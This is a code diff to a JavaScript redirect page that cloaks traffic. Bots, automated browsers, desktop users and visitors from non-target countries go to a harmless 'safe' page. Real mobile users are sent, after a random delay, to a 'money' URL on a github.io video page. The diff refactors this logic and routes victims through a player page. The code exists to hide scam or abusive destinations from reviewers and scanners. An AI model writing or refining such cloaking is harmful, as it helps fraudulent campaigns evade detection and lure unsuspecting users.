@@ -20,8 +20,6 @@ const CONFIG = {
   offers: {
     a1: {
       money: [
-        "https://pid-watch-tv.github.io/8scghHD91.mp4",
-        "https://pid-watch-tv.github.io/8scghHD91.mp4",
         "https://pid-watch-tv.github.io/8scghHD91.mp4"
       ],
       safe: "https://google.com"
@@ -51,29 +49,19 @@ async function getCountry() {
 }
 
 (async () => {
-  if (!CONFIG.offers[id]) {
-    location.href = "https://google.com";
-    return;
-  }
-
-  if (isBotUA || isWebdriver) {
-    location.href = CONFIG.offers[id].safe;
-    return;
-  }
-
-  if (CONFIG.mobileOnly && !isMobile) {
-    location.href = CONFIG.offers[id].safe;
-    return;
-  }
+  if (!CONFIG.offers[id]) return location.href = "https://google.com";
+  if (isBotUA || isWebdriver) return location.href = CONFIG.offers[id].safe;
+  if (CONFIG.mobileOnly && !isMobile) return location.href = CONFIG.offers[id].safe;
 
   const country = await getCountry();
-  if (CONFIG.allowedCountries.length && !CONFIG.allowedCountries.includes(country)) {
-    location.href = CONFIG.offers[id].safe;
-    return;
-  }
+  if (CONFIG.allowedCountries.length && !CONFIG.allowedCountries.includes(country))
+    return location.href = CONFIG.offers[id].safe;
 
-  const target = pick(CONFIG.offers[id].money);
-  setTimeout(() => location.replace(target), rand(CONFIG.delayMin, CONFIG.delayMax));
+  const video = pick(CONFIG.offers[id].money);
+
+  setTimeout(() => {
+    location.replace("player.html?v=" + encodeURIComponent(video));
+  }, rand(CONFIG.delayMin, CONFIG.delayMax));
 })();
 </script>
 
